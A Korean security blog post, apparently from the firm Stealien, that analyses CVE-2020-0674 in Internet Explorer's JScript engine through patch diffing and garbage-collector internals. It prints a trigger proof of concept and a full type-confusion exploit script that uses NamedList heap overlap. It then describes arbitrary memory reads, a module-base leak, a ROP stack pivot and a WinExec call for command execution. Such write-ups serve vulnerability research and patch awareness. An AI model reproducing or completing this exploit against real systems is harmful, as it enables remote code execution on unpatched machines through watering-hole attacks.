---
layout: post
title:  기술 블로그 오픈
date:   2020-04-13 00:00:00 +0900
category: ETC
author: Stealien
author_email: taejin@stealien.com
background: /assets/bg.png
profile_image: /assets/stealien_inverse.png
summary: 스틸리언 기술 블로그를 오픈하였습니다.
thumbnail: /assets/stealien.png
---
### 개요
 2020년 1월 14일, Microsoft Windows 7 운영체제의 지원이 중단되었다. 지원 중단된 운영체제를 사용할 경우, 보안 업데이트가 중단되어 악성 프로그램에 감염될 확률이 높다. 본 게시글은 공격자 관점에서 원격 코드 실행 취약점을 구현한다. 취약점을 구현하는 과정에서 요구되는 기술을 소개하고 보안 업데이트의 경각심을 높인다.

### 취약점 선택
 Windows 7 운영체제는 Internet Explorer(IE) 웹브라우저가 기본 탑재되어 있다. Windows 보안 패치를 적용하지 않을 경우, IE의 보안 패치가 적용되지 않는다. 최신 패치가 적용되지 않은 소프트웨어는 N-Day 취약점에 노출되므로 IE는 공격 대상으로 적합하다. Windows 7 지원이 중단된 다음달, 2월 11일 패치가 배포된 [CVE-2020-0674](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0674) 취약점은 scripting engine에서 발생하는 memory corruption 취약점으로, wild에서 [watering hole](https://wikipedia.org/wiki/Watering_hole_attack) 공격에 사용되었다. 본 취약점이 발생하는 [JScript](https://en.wikipedia.org/wiki/JScript)는 IE8 버전 이하에서 동작하지만, IE9 이상 버전에서 문서 호환성 모드를 이용하면 호출 가능하다. 본 취약점에 대해 online에 공개된 내용이 적어, 공격자는 보안 업데이트의 패치 내역을 조사하여 취약점 발생 지점을 파악하고 exploit을 구현해야 한다.

### 패치 내역 조사 (Patch Diffing)
 취약점 발생 지점을 파악하기 위해 scripting engine이 구현되어 있는 jscript.dll 모듈의 보안 업데이트 적용 전/후를 비교한다. 보안 업데이트 파일은 소프트웨어 제조사인 Microsoft 홈페이지에서 배포한다. 보안 업데이트 파일의 확장자는 msu이고, 파일 형식은 cab 압축 파일 형태이다. [Expand](https://docs.microsoft.com/windows-server/administration/windows-commands/expand) 도구를 이용하여 압축 해제 및 파일 추출이 가능하다.

 Diaphora, BinDiff 등의 diffing 도구를 IDA 디스어셈블러와 연동하여 사용한다. 패치 전 jscript.dll 5.8.9600.19597 버전과 패치 후 jscript.dll 5.8.9600.19626 버전을 비교한다.

| [![img](https://1.bp.blogspot.com/-5mCN19BwnII/XpWz4OKq_aI/AAAAAAAAAYQ/7WeU7Rwv8RMbGfn97-3MtqrBs4nB2lE7QCLcBGAsYHQ/s1600/1.png)](https://1.bp.blogspot.com/-5mCN19BwnII/XpWz4OKq_aI/AAAAAAAAAYQ/7WeU7Rwv8RMbGfn97-3MtqrBs4nB2lE7QCLcBGAsYHQ/s1600/1.png) |
| ------------------------------------------------------------ |
| 그림 1. Diaphora의 비교 결과                                 |

 `Parser::Parse`, `CScriptRuntime::EnsureGcAlloc`, `ScrFncObj::PerformCall`, `CSession::GetVarStack` 함수 등이 추가되었다.

 변경된 코드 중 Garbage Collector(GC)와 관련된 코드에 주목한다. 패치 이후 ScrFncObj::Call 함수가 간소화되고 기존 ScrFncObj::Call 함수의 코드가 새로운 이름의 ScrFncObj::PerformCall 함수에 구현되었다. 패치 이전 ScrFncObj::Call 함수의 코드가 ScrFncObj::PerformCall 함수로 이동된 부분을 제외하면, 추가된 코드는 ScavVarList::Init 함수 호출이다.

| [![img](https://1.bp.blogspot.com/-IRG_z06RREs/XpW0Qq5UrhI/AAAAAAAAAYY/4yUeynPmJogrsLTdpFid0HU6AGWotkvOgCLcBGAsYHQ/s1600/2.png)](https://1.bp.blogspot.com/-IRG_z06RREs/XpW0Qq5UrhI/AAAAAAAAAYY/4yUeynPmJogrsLTdpFid0HU6AGWotkvOgCLcBGAsYHQ/s1600/2.png) |
| ------------------------------------------------------------ |
| 그림 2. 패치 이전의 ScrFncObj::Call 함수                     |

| [![img](https://1.bp.blogspot.com/-g3f6dH0plbs/XpW0YZcqCtI/AAAAAAAAAYc/_Iy5APSsDEE7HJUtIhuJgO9rNT7kMmehACLcBGAsYHQ/s1600/3.png)](https://1.bp.blogspot.com/-g3f6dH0plbs/XpW0YZcqCtI/AAAAAAAAAYc/_Iy5APSsDEE7HJUtIhuJgO9rNT7kMmehACLcBGAsYHQ/s1600/3.png) |
| ------------------------------------------------------------ |
| 그림 3. 패치 이후의 ScrFncObj::PerformCall 함수              |

 ScrFncObj 클래스는 Script Function Object의 약자로 추정된다. ScrFncObj::Call 함수는 사용자 정의 함수 등의 스크립트가 call(호출)될 때 실행되는 함수다. 패치 이후 VAR::SetHeapJsObj 함수와 CScriptRuntime::Init 함수 사이에 ScavVarList 클래스를 사용하는 코드가 추가되었다. VarStack::ContainsVarList 함수는 session의 스택과 VarList를 인자로 받으며, session의 스택이 VarList를 포함하고 있는지 확인한다. VarList는 ScrFncObj::Call가 call하는 함수의 매개변수다. 추가된 코드를 해석하면, 매개변수가 현재 session의 스택에 포함되어 있지 않은 경우 ScavVarList::Init 함수를 호출한다. ScavVarList::Init는 IScavengerBase::LinkToGc 함수를 호출하여 VarList를 GC에 연결시킨다.

| [![img](https://1.bp.blogspot.com/-yzJyvhotqQM/XpW1DhRgZ-I/AAAAAAAAAYs/97yPtYIF03A_hka8XFq7byYdPzrVlktDwCLcBGAsYHQ/s1600/4.png)](https://1.bp.blogspot.com/-yzJyvhotqQM/XpW1DhRgZ-I/AAAAAAAAAYs/97yPtYIF03A_hka8XFq7byYdPzrVlktDwCLcBGAsYHQ/s1600/4.png) |
| ------------------------------------------------------------ |
| 그림 4. ScavVarList::Init 함수                               |

### Garbage Collector

 JScript는 Number, String, Object 등의 객체를 Variant 구조로 구현한다. Variant는 32비트 환경에서 0x10 크기이다. 오프셋 0의 2바이트는 객체의 종류, 오프셋 8의 4바이트는 데이터 포인터를 저장한다. 메모리 관리의 효율성을 위해 100개의 Variant 저장이 가능한 GcBlock을 사용한다. GcBlock은 double linked list 형태다. 첫 4바이트는 이전 블록을 가리키는 포인터, 다음 4바이트는 다음 블록을 가리키는 포인터, 이후 Variant 100개 저장이 가능한 구조다. 32비트 환경에서 4+4+16*100의 0x648 크기를 가진다.

 Garbage Collector는 표시하고 쓸기(Mark and Sweep) 알고리즘으로 동작한다. Mark(표시) 과정은 GcBlock을 순회하며 GcAlloc::SetMark 함수에서 수행한다. Variant 객체 종류를 나타내는 첫 2바이트에 0x800을 OR 연산하여 12번째 비트에 mark한다.

| [![img](https://1.bp.blogspot.com/-7sDNwdv5vq4/XpW1TuQbYmI/AAAAAAAAAY0/6Inc0JPQrkEsZkyBnP5VCJkmwPd3SO1uwCLcBGAsYHQ/s1600/5.png)](https://1.bp.blogspot.com/-7sDNwdv5vq4/XpW1TuQbYmI/AAAAAAAAAY0/6Inc0JPQrkEsZkyBnP5VCJkmwPd3SO1uwCLcBGAsYHQ/s1600/5.png) |
| ------------------------------------------------------------ |
| 그림 5. GcAlloc::SetMark 함수                                |

 다음으로 scavenge 과정을 수행한다. Scavenge 과정은 GcContext::ScavengeVar 함수에서 사용중인 Variant의 mark를 지운다. 0xF7FF를 AND 연산하여 12번째 비트를 0으로 설정한다.

| [![img](https://1.bp.blogspot.com/-nyLg1X5dG2E/XpW1cjeIHbI/AAAAAAAAAY4/pEIwkUjzhvYHw55NH9_FXdIEXENYOU3vACLcBGAsYHQ/s1600/6.png)](https://1.bp.blogspot.com/-nyLg1X5dG2E/XpW1cjeIHbI/AAAAAAAAAY4/pEIwkUjzhvYHw55NH9_FXdIEXENYOU3vACLcBGAsYHQ/s1600/6.png) |
| ------------------------------------------------------------ |
| 그림 6. GcContext::ScavengeVar 함수                          |

 Sweep(쓸기) 과정은 GcAlloc::ReclaimGarbage 함수에서 mark를 확인한 후 여전히 mark된 Variant에 대해 VAR::Clear 함수를 호출한다. VAR::Clear 함수는 객체 종류를 0으로 설정한다.

| [![img](https://1.bp.blogspot.com/-vO7oOXIq6IM/XpW1naA94wI/AAAAAAAAAZA/vtkoElJ7nL49y2scT6yRmMF_zvkoW7UEwCLcBGAsYHQ/s1600/7.png)](https://1.bp.blogspot.com/-vO7oOXIq6IM/XpW1naA94wI/AAAAAAAAAZA/vtkoElJ7nL49y2scT6yRmMF_zvkoW7UEwCLcBGAsYHQ/s1600/7.png) |
| ------------------------------------------------------------ |
| 그림 7. GcAlloc::ReclaimGarbage 함수                         |

| [![img](https://1.bp.blogspot.com/-_M31FsFcOcc/XpW1wNXynFI/AAAAAAAAAZI/Abvr433su2s2aIyOLATM9uJwDwI-SIeDQCLcBGAsYHQ/s1600/8.png)](https://1.bp.blogspot.com/-_M31FsFcOcc/XpW1wNXynFI/AAAAAAAAAZI/Abvr433su2s2aIyOLATM9uJwDwI-SIeDQCLcBGAsYHQ/s1600/8.png) |
| ------------------------------------------------------------ |
| 그림 8. VAR::Clear 함수                                      |

 GcBlock 내의 모든 Variant가 clear 상태일 때 GcBlockFactory::FreeBlk가 호출되며, GcBlockFactory::FreeBlk가 50번 호출될 때 메모리 free가 이루어진다.

| [![img](https://1.bp.blogspot.com/-sCNMKE8tKlc/XpW13e22WII/AAAAAAAAAZQ/CX1xXHreb30amw_LdpDPCAxyN89EtEPIACLcBGAsYHQ/s1600/9.png)](https://1.bp.blogspot.com/-sCNMKE8tKlc/XpW13e22WII/AAAAAAAAAZQ/CX1xXHreb30amw_LdpDPCAxyN89EtEPIACLcBGAsYHQ/s1600/9.png) |
| ------------------------------------------------------------ |
| 그림 9. GcBlockFactory::FreeBlk 함수                         |


### 취약점 트리거

 패치 내역 조사 결과로 미루어 보아 본 취약점은 함수 매개변수가 GC에 연결되지 않아 발생한다. 매개변수를 포인터로 사용하면 함수 실행중 매개변수가 Variant를 가리키게 설정 가능하다. 매개변수가 Variant를 가리키고 있는 상태에서 Variant를 해제하고 GC를 수행한다. 정상적인 경우, 매개변수가 가리키고 있는 Variant는 사용중이므로 scavenge에 의해 mark가 제거되어야 한다. 매개변수가 GC에 연결되어 있지 않은 경우, scavenge 과정에서 생략된다. Scavenge 과정에서 생략되어 mark가 제거되지 않으면, sweep 과정에서 mark된 Variant가 clear 된다. 이후 매개변수에서 Variant를 참조하면 매개변수는 Variant를 가리키고 있지만 해당 Variant는 clear된 상태이므로 Use After Free 취약점이 발생한다. JsArrayFunctionHeapSort, JsJSONStringify 등의 콜백함수에서 생성되어 전달되는 매개변수는 스택에 포함되어 있지 않다. 콜백함수에서 매개변수에 Variant를 저장하고, Variant를 해제한 후 GC를 수행하여 취약점 트리거가 가능하다.

개념 증명 코드는 다음과 같다.



```
<script language="Jscript.Encode">
    var arr = new Array(1, 2);
    arr.sort(fncCompare);
     
    function fncCompare(arg1, arg2) {
        var variant = new Object();
        arg1 = variant;
         
        variant = null;
        CollectGarbage();
         
        alert( typeof arg1 );
    }
</script>
```


 Typeof 명령어를 사용하면 CScriptRuntime::TypeOf 함수에서 Variant 객체 종류를 식별한다. 개념 증명 코드에서 typeof하는 Variant는 clear 상태이다. Clear 상태인 Variant는 객체 종류가 0이므로 typeof 결과가 undefined으로 출력된다.

| [![img](https://1.bp.blogspot.com/-DAnwkW4fONc/XrpP1DQ79HI/AAAAAAAAAcM/-Y1aR4L0JVc73TKXe7JAcQXgH98kqq_rwCLcBGAsYHQ/s1600/10.png)](https://1.bp.blogspot.com/-DAnwkW4fONc/XrpP1DQ79HI/AAAAAAAAAcM/-Y1aR4L0JVc73TKXe7JAcQXgH98kqq_rwCLcBGAsYHQ/s1600/10.png) |
| ------------------------------------------------------------ |
| 그림 10. TypeOf 함수에서 식별하는 Variant 메모리 덤프        |


### NamedList를 이용한 Type Confusion

 GcBlock이 해제된 후, 같은 크기의 메모리를 할당하면 LFH(Low Fragmentation Heap)에 의해 같은 주소에 메모리가 할당되어 Type Confusion을 발생시킬 수 있다. GcBlock은 GcBlockFactory::FreeBlk가 50번 호출되어야 메모리 해제를 수행한다. 임의의 Varaint를 50*100개 해제한 후 GC를 호출하면 GcBlock 50개가 해제되므로 메모리 해제가 수행된다. JScript를 이용하는 공격자들은 원하는 크기의 메모리를 할당하기 위해 NamedList를 사용한다. 32비트 시스템에서 NamedList의 메모리는 ((2*이름길이+0x32)*2+4) 크기로 할당된다. GcBlock의 크기는 0x648 이므로, 0x178 길이의 이름을 사용할 경우 0x648 크기의 메모리가 할당된다.

| [![img](https://1.bp.blogspot.com/-8_SqMLfIWqc/XpW4p9eoEPI/AAAAAAAAAZk/dblZOnQYqCE89Ec9SgEkZk0t_MWFhnivwCLcBGAsYHQ/s1600/11.png)](https://1.bp.blogspot.com/-8_SqMLfIWqc/XpW4p9eoEPI/AAAAAAAAAZk/dblZOnQYqCE89Ec9SgEkZk0t_MWFhnivwCLcBGAsYHQ/s1600/11.png) |
| ------------------------------------------------------------ |
| 그림 11. NameList::FCreateVval 함수에서 메모리 할당          |

 매개변수가 가리키고 있는 해제된 Variant 위치에 새로 할당한 NamedList가 위치해야한다. 한 번의 Use After Free로는 가능성이 낮다. Exploit의 신뢰성을 높이기 위해 재귀함수를 이용하여 JsArrayFunctionHeapSort 함수를 1000번 호출한다. 콜백함수가 1000번 호출되면, 매개변수를 1000번 사용할 수 있다. Variant를 1000개 생성한 후, 재귀함수에서 각 매개변수에 대입한다. 각 매개변수는 전역변수에 저장해두고, 마지막 재귀함수에서 Variant를 해제하고 GC를 호출하여 취약점을 발생시킨다. 해제된 Variant 위치에 공격자가 컨트롤한 데이터를 위치시키기 위해 NamedList를 다수 생성한다.

 Number Variant의 종류는 0x0003 이다. NamedList를 이용하여 가짜 Number Variant를 만든다. NamedList에서 생성하는 가짜 Variant는 해제되기 전 GcBlock에 위치한 Variant와 동일한 위치에 적재되어야 한다. NamedList는 GcBlock과 구조가 다르므로 패딩을 주어 위치를 맞춘다.

Type Confusion을 이용하여 가짜 Number를 구현한 코드는 다음과 같다.



```
<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
<script language="Jscript.Encode">
    var arr_spray = new Array();
    var arr_uaf = new Array();
    var arr_overlap = new Array();
 
    var arr_ref = new Array();
    var arr_sort = new Array();
 
    var callback_idx = 0;
    var maxnum = 1000;
 
    var name = "\u4141\u4141"; // padding
    while (name.length != 0x16A) {
        name += "\u0003\u0000\u0000\u0000\u1337\u0000\u0000\u0000"; // 0x0003 is Number
    }
    while (name.length != 0x178) {
        name += "\u4141";
    }
    
    function fncCompare(arg1, arg2) {
        if (callback_idx < (maxnum-1)) {
            arg1 = arr_uaf[callback_idx];
            callback_idx = callback_idx + 1;
            arr_sort[callback_idx].sort(fncCompare);
            arr_ref.push(arg1);
 
        } else {
 
            // for GcBlockFactory::FreeBlk
            for (var i = 0; i < 50 * 100; i++) {
                arr_spray[i] = new Object();
            }
            for (var i = 0; i < 50 * 100; i++) {
                arr_spray[i] = null;
            }
            CollectGarbage();
 
            // free
            for (var i = 0; i < maxnum; i++) {
                arr_uaf[i] = null;
            }
            CollectGarbage();
 
            // overlap
            for (var i = 0; i < 0x1000; i++) {
                arr_overlap[i][name] = 1;
            }
        }
 
        return 1;
    }
 
    for (var i = 0; i < 0x1000; i++) {
        arr_overlap[i] = new Array();
    }
 
    for (var i = 0; i < maxnum; i++) {
        arr_sort[i] = new Array(1, 2);
    }
 
    for (var i = 0; i < maxnum; i++) {
        arr_uaf[i] = new Object();
    }
 
    arr_sort[0].sort(fncCompare);
 
    for (var i = 0; i < maxnum; i++) {
        if ((typeof arr_ref[i]) === "number") {
            if (arr_ref[i] === 0x1337) {
                alert( i + " / " + typeof arr_ref[i] + " / " + arr_ref[i].toString(16) );
                break;
            }
        }
    }
</script>
```


실행 결과는 다음과 같다.

| [![img](https://1.bp.blogspot.com/-Ac3KDPe1Q8s/XpW5NWkkiiI/AAAAAAAAAZw/mMaud4VRVW4PjCMsUVWvE0F8vW1MzT2JgCLcBGAsYHQ/s1600/12.png)](https://1.bp.blogspot.com/-Ac3KDPe1Q8s/XpW5NWkkiiI/AAAAAAAAAZw/mMaud4VRVW4PjCMsUVWvE0F8vW1MzT2JgCLcBGAsYHQ/s1600/12.png) |
| ------------------------------------------------------------ |
| 그림 12. 사용 중인 Object Variant                            |

| [![img](https://1.bp.blogspot.com/-DXvJzovYtbg/XpW5U59a23I/AAAAAAAAAZ0/Qs6NUabRUCEpcCy9c1BxC7zqZK8Q6dTrgCLcBGAsYHQ/s1600/13.png)](https://1.bp.blogspot.com/-DXvJzovYtbg/XpW5U59a23I/AAAAAAAAAZ0/Qs6NUabRUCEpcCy9c1BxC7zqZK8Q6dTrgCLcBGAsYHQ/s1600/13.png) |
| ------------------------------------------------------------ |
| 그림 13. Clear 및 free된 Variant                             |

| [![img](https://1.bp.blogspot.com/-mMFAxlerKWc/XpW5bpGz11I/AAAAAAAAAZ4/eqUu1eJFCO49xCVllhDdYro_aT-MxgJAQCLcBGAsYHQ/s1600/14.png)](https://1.bp.blogspot.com/-mMFAxlerKWc/XpW5bpGz11I/AAAAAAAAAZ4/eqUu1eJFCO49xCVllhDdYro_aT-MxgJAQCLcBGAsYHQ/s1600/14.png) |
| ------------------------------------------------------------ |
| 그림 14. NamedList에 의해 overlap되어 생성된 가짜 Number Variant |

| [![img](https://1.bp.blogspot.com/-C33SopK3qyE/XpW5jPkpXWI/AAAAAAAAAZ8/8WcC6kCCDFc9irSRdu8zlvE7kh9PjXlrQCLcBGAsYHQ/s1600/15.png)](https://1.bp.blogspot.com/-C33SopK3qyE/XpW5jPkpXWI/AAAAAAAAAZ8/8WcC6kCCDFc9irSRdu8zlvE7kh9PjXlrQCLcBGAsYHQ/s1600/15.png) |
| ------------------------------------------------------------ |
| 그림 15. Type Confusion된 가짜 Number를 출력한 결과          |


### Type Confusion을 이용한 Arbitrary Read

 JScript는 문자열을 [BSTR](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/automat/bstr) 형식으로 저장한다. 문자열을 나타내는 String Variant의 종류는 0x82 이고, 데이터는 BSTR의 Data String 포인터를 가리킨다. Type Confusion을 통해 가짜 String Variant를 생성할 때, BSTR의 포인터 대신 읽고자 하는 메모리 주소를 삽입한 후 문자열을 읽으면 임의 메모리 읽기가 가능하다.
 JScript의 Image Base 주소를 얻기 위해 Object 객체의 메모리를 읽어야 한다. Object 객체는 종류 0x81인 Object Variant가 가리킨다. Use After Free 취약점에 사용되는 Object Variant에 RegExp 객체를 사용할 경우, Object Variant의 데이터는 RegExp 포인터가 저장된다. GcBlock을 해제하면 VAR::Clear가 Object Variant의 종류를 0으로 설정하지만, 데이터는 지우지 않는다. 이후 해제된 GcBlock을 재사용할 때, GcBlock은 해제되기 전 Object Variant의 데이터에 존재하는 RegExp 객체 포인터를 가지고 있다. 가짜 Number Variant의 데이터로 입력한 \u1337을 입력하지 않으면, 기존에 존재하는 RegExp 객체 포인터를 읽는다. RegExp 객체를 생성할 때, 패턴을 지정하면 RegExp 객체와 컴파일된 패턴 문자열이 차례로 GcBlock에 생성된다. 패턴 문자열은 문자열이 필요한 경우 사용이 가능하다.

| [![img](https://1.bp.blogspot.com/-KJwvWmMrvFo/XrpXaxmlLUI/AAAAAAAAAcs/OhSRxhaHDDwwRYHjXnhA8PfioLV4SKRmwCLcBGAsYHQ/s1600/16.png)](https://1.bp.blogspot.com/-KJwvWmMrvFo/XrpXaxmlLUI/AAAAAAAAAcs/OhSRxhaHDDwwRYHjXnhA8PfioLV4SKRmwCLcBGAsYHQ/s1600/16.png) |
| ------------------------------------------------------------ |
| 그림 16. NamedList에 의해 생성된 가짜 Number Variant와 객체 포인터 |

 객체 메모리를 읽기 위해 가짜 String Variant를 생성하고 객체 포인터를 String Variant의 데이터로 삽입한다. 객체의 첫 4바이트는 JScript 모듈에 위치하는 객체 함수 주소 테이블이고, 오프셋 0x40 바이트 위치에 컴파일된 패턴 Variant의 주소가 있다. 객체 함수 주소 테이블에 0xFFFF0000을 AND 연산하여 JScript의 Image Base를 얻는다. 컴파일된 패턴 Variant 주소는 GcBlock에 존재하므로 RegExp 객체의 오프셋 0x40 바이트의 4바이트를 읽으면 NamedList Overlap을 수행하는 GcBlock의 주소를 알 수 있다.

| [![img](https://1.bp.blogspot.com/-jawcbj-a3WM/XrpVqc4ZHzI/AAAAAAAAAcg/GGepcN1b-4k2UMqRr9wivBDtPETBA-irQCLcBGAsYHQ/s1600/17.png)](https://1.bp.blogspot.com/-jawcbj-a3WM/XrpVqc4ZHzI/AAAAAAAAAcg/GGepcN1b-4k2UMqRr9wivBDtPETBA-irQCLcBGAsYHQ/s1600/17.png) |
| ------------------------------------------------------------ |
| 그림 17. RegExp 객체 메모리                                  |

JScript 모듈 주소를 기반으로 Kernel32 모듈의 WinExec 함수 주소를 구한다.

### Code Execution
 Object Variant를 이용하여 코드 실행이 가능하다. Typeof 메소드를 처리하는 CScriptRuntime::TypeOf에서 Variant의 데이터가 가리키는 값에 0x9C를 더한 주소가 가리키는 값으로 EIP가 변경된다.

| [![img](https://1.bp.blogspot.com/-q1gaYztKQqE/Xrpcao5BKxI/AAAAAAAAAc4/Gf-3HBL_OB840rHp_x0MOmksmxgT0iiewCLcBGAsYHQ/s1600/18.png)](https://1.bp.blogspot.com/-q1gaYztKQqE/Xrpcao5BKxI/AAAAAAAAAc4/Gf-3HBL_OB840rHp_x0MOmksmxgT0iiewCLcBGAsYHQ/s1600/18.png) |
| ------------------------------------------------------------ |
| 그림 18. CScriptRuntime::TypeOf 함수에서 가상 함수 호출      |

 가짜 Object Variant를 생성하고 데이터 포인터로 현재 GcBlock의 조작 가능한 주소를 삽입한다. NamedList를 이용하여 데이터를 알맞게 조립하면 EIP 변경이 가능하다. EIP 변경을 통해 WinExec 호출이 가능하지만 인자 전달이 안되므로 JScript 내에 위치한 ROP 가젯을 이용한다. 가상 함수를 호출하기 전, EAX 레지스터에 Object Variant 데이터 포인터가 가리키는 값이 저장된다. EAX 값을 ESP로 이동하는 가젯으로 EIP를 변경한 후, WinExec로 이동하면 스택이 GcBlock에 존재하므로 인자 조절이 가능하다. RegExp 객체의 컴파일된 패턴 문자열을 WinExec의 인자로 사용하여 공격자가 원하는 명령어 실행이 가능하다.

| [![img](https://1.bp.blogspot.com/-hTMwq9JBsIE/Xrph2uoMPCI/AAAAAAAAAdE/ROD3mom7bwU_pRubdy6Qhh0UN9BXn-GUACLcBGAsYHQ/s1600/19.png)](https://1.bp.blogspot.com/-hTMwq9JBsIE/Xrph2uoMPCI/AAAAAAAAAdE/ROD3mom7bwU_pRubdy6Qhh0UN9BXn-GUACLcBGAsYHQ/s1600/19.png) |
| ------------------------------------------------------------ |
| 그림 19. WinExec 호출하여 커맨드 실행                        |

 